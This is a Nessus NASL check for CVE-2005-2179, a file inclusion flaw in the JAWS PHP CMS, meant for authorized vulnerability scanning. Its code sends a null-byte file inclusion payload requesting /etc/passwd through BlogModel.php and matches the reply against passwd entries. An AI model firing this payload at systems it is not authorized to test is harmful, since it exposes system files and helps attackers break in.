#
# This script was written by Josh Zlatin-Amishav
#
# GPLv2
#
# Fixed by Tenable:
#   - added CVE xref
#   - added See also and Solution.
#   - fixed script family.
#   - changed exploit and test of its success.

if(description)
{
  script_id(19395);
  script_cve_id("CVE-2005-2179");
  script_bugtraq_id(14158);
  script_version("$Revision: 1.5 $");
  name["english"] = "File Inclusion Vulnerability in Jaws";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running JAWS, a content management system written
in PHP. 

The remote version of Jaws allows an attacker to include URLs
remotely. 

See also : http://www.hardened-php.net/advisory-072005.php
Solution : Upgrade to JAWS version 0.5.3 or later.
Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect Jaws File Inclusion Vulnerability";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"Copyright (C) 2005 Josh Zlatin-Amishav");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);
if (! can_host_php(port:port) ) exit(0);

foreach dir ( cgi_dirs() )
{
  req = http_get(
    item:string(
      dir, "/gadgets/Blog/BlogModel.php?",
      "path=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if ( res == NULL ) exit(0);

  if ( 
    # we could read /etc/passwd.
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we got an error suggesting magic_quotes_gpc was enabled but
    # remote URLs might still work.
    egrep(string:res, pattern:"Warning: main\(/etc/passwd.+failed to open stream") ||
    egrep(string:res, pattern:"Warning: .+ Failed opening '/etc/passwd.+for inclusion")
  ) {
   security_hole(port);
   exit(0);
  }
}
